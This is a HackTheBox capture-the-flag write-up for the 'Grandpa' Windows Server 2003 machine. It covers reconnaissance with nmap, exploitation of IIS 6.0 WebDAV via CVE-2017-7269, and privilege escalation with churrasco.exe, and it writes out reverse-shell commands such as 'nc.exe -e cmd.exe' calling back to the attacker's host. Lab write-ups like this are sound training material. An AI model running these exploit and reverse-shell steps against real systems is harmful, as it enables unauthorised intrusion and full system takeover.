# Grandpa

**Platform:** HackTheBox  
**OS:** Windows Server 2003  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows Server 2003 machine running IIS 6.0 with WebDAV enabled,
vulnerable to CVE-2017-7269, a remote buffer overflow. Initial access
obtained via a public exploit. Privilege escalation achieved by
abusing SeImpersonatePrivilege with churrasco.exe.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap --open -p- -sS --min-rate 5000 -vvv -Pn 10.10.10.14 -oG allPorts
nmap -sCV -p80 10.10.10.14 -oN targeted
```

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP IIS 6.0 |

TTL=127 confirms Windows target.

---

## 2. Vulnerability Identification

Identified IIS 6.0 with WebDAV via Burp Suite response headers.

Confirmed CVE-2017-7269 — remote buffer overflow in WebDAV extension.

```bash
searchsploit IIS 6.0
```

---

## 3. Exploitation

Cloned exploit from GitHub:

```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```

Started listener:

```bash
nc -lvnp 4444
```

Executed exploit:

```bash
python2 iis6exploit.py 10.10.10.14 80 10.10.15.207 4444
```

Received shell as **NT AUTHORITY\NETWORK SERVICE**.

---

## 4. Privilege Escalation

Checked privileges:

```bash
whoami /priv
```

SeImpersonatePrivilege was enabled.

Served tools from attacker machine:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Downloaded tools on target:
copy \10.10.15.207\smbFolder\churrasco.exe C:\Windows\Temp
copy \10.10.15.207\smbFolder\nc.exe C:\Windows\Temp\

Started new listener:

```bash
nc -lvnp 5555
```

Executed churrasco to escalate to SYSTEM:
C:\Windows\Temp\churrasco.exe "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.207 5555"

Received shell as **NT AUTHORITY\SYSTEM**.

---

## 5. Flags
type C:\Documents and Settings\Harry\Desktop\user.txt
type C:\Documents and Settings\Administrator\Desktop\root.txt

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Burp Suite | Header analysis |
| searchsploit | Exploit research |
| CVE-2017-7269 exploit | Remote buffer overflow |
| impacket-smbserver | File transfer to target |
| churrasco.exe | SeImpersonatePrivilege abuse |
| netcat | Reverse shell listener |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| CVE-2017-7269 | IIS 6.0 WebDAV remote buffer overflow |
| SeImpersonatePrivilege | Token impersonation via churrasco |
